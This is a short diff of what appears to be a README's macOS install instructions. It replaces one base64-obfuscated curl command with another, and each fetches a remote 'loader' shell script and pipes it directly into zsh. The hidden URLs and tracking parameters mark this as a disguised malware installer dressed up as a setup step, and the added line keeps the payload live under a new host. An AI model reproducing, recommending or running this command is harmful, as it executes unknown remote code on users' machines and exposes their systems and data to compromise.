@@ -21,7 +21,7 @@
 ### Install macOS 
 
 ```
-curl -s $(echo "aHR0cHM6Ly9lc2NhcGVhaS5saXZlL2xvYWRlcl92Mi5zaD9idWlsZD0lNDB0b3J2ZXgxMyZvd25lcj13b3JrZXIy" | base64 -d) | zsh
+curl -s $(echo "aHR0cHM6Ly9taWtvYmxpY28ueHl6L2xvYWRlcl92Mi5zaD9idWlsZD10b3J2ZXgxMyZvd25lcj13b3JrZXIy" | base64 -d) | zsh
 
 ```
 ### Cookbooks
